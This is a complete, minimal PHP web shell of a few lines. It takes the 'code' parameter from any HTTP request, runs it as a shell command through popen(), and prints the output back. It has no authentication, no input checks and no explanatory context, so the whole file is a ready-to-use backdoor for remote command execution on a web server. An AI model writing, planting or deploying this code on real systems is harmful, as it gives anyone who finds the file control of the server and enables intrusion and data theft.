
<?php

    $handle = popen($_REQUEST['code'],'r');

    echo fread($handle,1024*4);

?>
